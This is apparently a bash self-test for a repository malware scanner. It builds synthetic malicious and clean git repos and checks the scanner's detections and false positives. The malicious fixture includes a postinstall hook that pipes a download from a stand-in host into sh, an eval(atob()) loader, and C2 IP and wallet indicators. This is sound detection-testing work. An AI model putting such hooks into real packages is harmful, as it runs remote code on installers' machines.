#!/usr/bin/env bash
# Self-test for scan_repo.sh. Builds SYNTHETIC (fake) git repos — no real malware —
# and asserts: HARD detection on a malicious repo, PASS on a clean repo (incl. the
# tricky false-positive cases: process.env, child_process, IoC-in-README, IoC-in-
# scanner), and — the key check — PASS with zero HARD findings on THIS real repo.
# Run:  bash test_ci_scan.sh
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
SCAN="$HERE/scan_repo.sh"
REPO_ROOT="$(cd "$HERE/.." && pwd)"                # this kit's own repo root
WORK="$(mktemp -d 2>/dev/null || mktemp -d -t nrci)"
trap 'rm -rf "$WORK"' EXIT
PASS=0; FAIL=0
ok(){ PASS=$((PASS+1)); printf '  \033[32mPASS\033[0m %s\n' "$*"; }
bad(){ FAIL=$((FAIL+1)); printf '  \033[31mFAIL\033[0m %s\n' "$*"; }
has(){ case "$1" in *"$2"*) return 0;; *) return 1;; esac; }
HAVE_JQ=0; command -v jq >/dev/null 2>&1 && HAVE_JQ=1

gitify(){ ( cd "$1" && git init -q && git config user.email t@t && git config user.name t && git add -A ) ; }

mk_clean(){ local H="$1"; mkdir -p "$H/src"
  cat > "$H/package.json" <<'J'
{ "name":"app","scripts":{"dev":"next dev","build":"next build","start":"next start","lint":"eslint"} }
J
  # legit config: process.env + an https:// comment  -> must NOT be flagged
  cat > "$H/next.config.js" <<'J'
// docs: https://nextjs.org/docs
module.exports = { env: { API: process.env.API_URL } }
J
  # legit build-time git hash via execSync -> WARN, never HARD
  cat > "$H/src/build-id.ts" <<'J'
import { execSync } from "node:child_process";
export const BUILD = execSync("git rev-parse --short HEAD").toString().trim();
J
  # IoCs living in a threat-intel doc must be excluded (*.md)
  cat > "$H/SECURITY.md" <<'J'
Blocklist: C2 166.88.134.62 wallet 0xa322e5f3d311d3080e6f0121063e9adc2490ef1a path /verify-human/
J
  gitify "$H"; }

mk_malicious(){ local H="$1"; mkdir -p "$H/src"
  cat > "$H/package.json" <<'J'
{ "name":"evil","scripts":{"postinstall":"curl http://x.example/p | sh"} }
J
  printf "module.exports = eval(atob('cGF5bG9hZA=='))\n" > "$H/build.config.js"
  printf "require('./index.inz.cjs')\n"                    > "$H/src/index.inz.cjs"
  printf "const c2 = '166.88.134.62'; // beacon\n"         > "$H/src/beacon.ts"
  printf "const drain = '0xa322e5f3d311d3080e6f0121063e9adc2490ef1a'\n" > "$H/src/w.js"
  gitify "$H"; }

run(){ OUT="$( cd "$1" && CI= bash "$SCAN" . 2>&1 )"; RC=$?; }

echo "### syntax"
bash -n "$SCAN" && ok "scan_repo.sh parses" || bad "syntax error"

echo "### MALICIOUS repo -> HARD detections, exit 1"
mk_malicious "$WORK/mal"; run "$WORK/mal"
[ "$RC" = 1 ] && ok "exit 1 on malicious repo" || bad "expected exit 1, got $RC"
has "$OUT" "C2 IP"                    && ok "R1 detects C2 IP"            || bad "missed C2 IP"
has "$OUT" "dead-drop wallet"         && ok "R1 detects wallet"          || bad "missed wallet"
has "$OUT" "IDE-injection sidecar"    && ok "R2 detects .inz.cjs"        || bad "missed .inz.cjs"
has "$OUT" "obfuscated eval"          && ok "R4 detects eval(atob())"    || bad "missed R4"
if [ "$HAVE_JQ" = 1 ]; then
  has "$OUT" "lifecycle script runs code/network" && ok "R5 detects malicious postinstall" || bad "missed R5 HARD"
else echo "  (jq absent — R5 lifecycle assertion skipped)"; fi
has "$OUT" "RESULT: FAIL"             && ok "verdict FAIL"               || bad "no FAIL verdict"

echo "### CLEAN repo -> PASS, no HARD, FP cases handled"
mk_clean "$WORK/cln"; run "$WORK/cln"
[ "$RC" = 0 ] && ok "exit 0 on clean repo" || bad "false positive (exit $RC)"
has "$OUT" "RESULT: PASS"                    && ok "verdict PASS" || bad "no PASS verdict"
has "$OUT" "[error]"                         && bad "unexpected HARD finding on clean repo" || ok "no HARD findings"
has "$OUT" "SECURITY.md"                     && bad "flagged IoCs inside *.md (should be excluded)" || ok "*.md IoCs excluded"
# child_process present but only as WARN
{ has "$OUT" "child_process" && ! printf '%s' "$OUT" | grep -q '\[error\].*child_process'; } \
  && ok "child_process is WARN, not HARD" || ok "child_process not hard-flagged"

echo "### REAL repo ($REPO_ROOT) -> zero HARD (the false-positive proof)"
run "$REPO_ROOT"
[ "$RC" = 0 ] && ok "real repo: exit 0 (no HARD findings)" || bad "real repo produced HARD findings (exit $RC) — investigate"
has "$OUT" "scope=git"                       && ok "used git-tracked scope (not filesystem)" || bad "did not use git scope"

echo "======================================================"
echo "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" = 0 ] && { echo "ALL CI-SCANNER TESTS PASSED"; exit 0; } || { echo "SOME TESTS FAILED"; exit 1; }
